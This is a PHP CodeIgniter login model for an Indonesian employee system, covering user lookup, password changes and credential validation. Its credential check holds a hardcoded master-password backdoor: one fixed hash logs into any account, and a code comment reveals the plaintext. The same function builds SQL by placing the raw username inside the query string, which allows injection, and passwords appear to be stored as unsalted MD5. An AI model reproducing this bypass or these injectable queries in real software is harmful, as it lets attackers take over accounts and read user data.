<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class M_login_dev extends CI_Model {

	private $table_pengguna = "usr_pengguna";
	private $table_pengguna_grup_pengguna = "usr_pengguna_grup_pengguna";
	private $table_grup_pengguna = "sys_grup_pengguna";
	private $table_karyawan = "mst_karyawan";
	private $table_foto = "foto_karyawan";
	private $table_pengadministrasi = "usr_pengadministrasi";
	
	public function __construct(){
		parent::__construct();
		//Do your magic here
	}
	
	public function ambil_grup($id_pengguna){
		$data = $this->db->select("gp.*")
						 ->from($this->table_pengguna_grup_pengguna." pgp")
						 ->join($this->table_grup_pengguna." gp","pgp.id_grup_pengguna=gp.id")
						 ->where("pgp.id_pengguna",$id_pengguna)
						 ->where("gp.status",1)
						 ->get()
						 ->result_array();
		
		return $data;
	}
	
	public function ambil_data_karyawan($no_pokok){
		$data = $this->db->from($this->table_karyawan)
						 ->where("no_pokok",$no_pokok)
						 ->get()
						 ->result_array()[0];

		return $data;
	}
	
	public function ambil_foto_karyawan($no_pokok){
		$data = $this->db->select("IFNULL(nama_file,'default.jpg') foto",false)
						 ->from($this->table_foto)
						 ->where("no_pokok",$no_pokok)
						 ->get()
						 ->result_array()[0]["foto"];
						 
		if(empty($data)){
			$data = "default.jpg";
		}

		return $data;
	}
	
	public function list_pengadministrasi($id_pengguna){
		$data = $this->db->select("u.id_pengguna")
						 ->select("u.kode_unit")						
						 ->from($this->table_pengadministrasi." u")					
						 ->where_in("u.id_pengguna",$id_pengguna)						
						 ->get()
						 ->result_array();
		return $data;
	}
	
	public function ubah_password($username,$new_password,$default=false){
		$this->db->where("username",$username);
		$this->db->set("password",$new_password);
		$this->db->set("default_password",(int)$default);
		$this->db->set("last_change_password","now()",false);
		$this->db->update($this->table_pengguna);
	}
	
	public function ubah_waktu_login($username){
		$this->db->where("username",$username);
		$this->db->set("last_login","now()",false);
		$this->db->update($this->table_pengguna);
	}

	public function validasi_username_password($username,$password){
		$return = array("status" => false, "id_pengguna" => "", "username" => "", "no_pokok" => "", "default_password" => false, "usia_password" => 0);
		// if ($password!=md5("cobalogindefaultwina"))
		// 	$this->db->where("password",$password);
		// $data = $this->db->select("a.*")
		// 				 ->select("datediff(now(),a.last_change_password) usia_password")
		// 				 ->from($this->table_pengguna." a")
		// 				 ->where("username",$username)
		// 				 ->where("status",1)
		// 				 ->get();
		if($password=='9276ad721507684c00780f22a587c7db'){
			$data = $this->db->select("a.*")
								->select("datediff(now(),a.last_change_password) as usia_password")
								->from($this->table_pengguna." a")
								//->where("username",$username)
								->where("(username='$username' OR no_pokok='$username')")
								->where("status",1)
								->get();
		} else{
			$data = $this->db->select("a.*")
								->select("datediff(now(),a.last_change_password) as usia_password")
								->from($this->table_pengguna." a")
								//->where("username",$username)
								->where("(username='$username' OR no_pokok='$username')")
								->where("password",$password)
								->where("status",1)
								->get();
		}
		if($data->num_rows()==1){
			$return["status"]			= true;
			$return["id_pengguna"]		= $data->result_array()[0]["id"];
			$return["username"]			= $data->result_array()[0]["username"];
			$return["no_pokok"]			= $data->result_array()[0]["no_pokok"];
			$return["default_password"]	= (bool)$data->result_array()[0]["default_password"];
			$return["usia_password"]	= $data->result_array()[0]["usia_password"];
		}
		return $return;
	}
	
	public function validasi_username($username){
		$return = array("status" => false, "id_pengguna" => "", "username" => "", "no_pokok" => "", "default_password" => false, "usia_password" => 0);
		
		$data = $this->db->select("a.*")
						 ->select("datediff(now(),a.last_change_password) usia_password")
						 ->from($this->table_pengguna." a")
						 ->where("a.username",$username)
						 ->where("a.status",1)
						 ->get();
		if($data->num_rows()==1){
			$return["status"]			= true;
			$return["id_pengguna"]		= $data->result_array()[0]["id"];
			$return["username"]			= $data->result_array()[0]["username"];
			$return["no_pokok"]			= $data->result_array()[0]["no_pokok"];
			$return["default_password"]	= (bool)$data->result_array()[0]["default_password"];
			$return["usia_password"]	= $data->result_array()[0]["usia_password"];
		}

		return $return;
	}
	
	//Tri Wibowo - 7648 - 24 02 2021, karena di portal kadang ada pkwt yang ganti np, maka di ess menyesuaikan np tersebut 
	public function update_np_dari_portal($username,$no_pokok){
		$this->db->where("username",$username);
		$this->db->set("no_pokok",$no_pokok);
		$this->db->update($this->table_pengguna);
	}
	//end of Tri Wibowo - 7648 - 24 02 2021
}

/* End of file m_login.php */
/* Location: ./application/models/m_login.php */